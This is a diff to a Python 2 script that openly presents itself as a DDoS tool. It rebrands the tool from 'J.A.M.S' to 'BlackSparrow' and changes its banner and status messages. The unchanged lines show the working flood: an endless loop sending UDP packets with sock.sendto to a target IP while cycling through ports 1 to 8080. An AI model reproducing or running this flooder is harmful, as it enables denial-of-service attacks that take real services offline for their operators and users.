@@ -39,7 +39,7 @@ print "#----/-_----------------->--------#"
 print "#---------------------->----------#"
 print (Colors. CYAN) + (Colors.BOLD) + ("#---That's your responsibility----#") + (Colors.ENDC)
 print "###################################"
-word = 'J.A.M.S'
+word = 'B.L.A.C.K'
 for char in word:
     print(char)
 print "                    _       _                ___"
@@ -79,14 +79,13 @@ print (Colors. BLUE) + (Colors.BOLD) + ("[connection:BlackSparrow] !") + (Colors
 time.sleep(1)
 print (Colors. YELLOW) + (Colors.BOLD) + ("[BlackSparrow] !") + (Colors.ENDC)
 time.sleep(2)
-print (Colors. CYAN) + (Colors.BOLD) + ("[JAMS -> DDOS] !") + (Colors.ENDC)
+print (Colors. CYAN) + (Colors.BOLD) + ("[BALCKsparrow -> DDOS] !") + (Colors.ENDC)
 time.sleep(1.6)
 sent = 10
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s J.A.M.S [J.M.S.E.E.N.A]packet to %s open port:%s"%(sent,ip,port)
+     print "Sent %s BS [injecting]packet to %s open port:%s"%(sent,ip,port)
      if port == 8080:
        port = 1
-
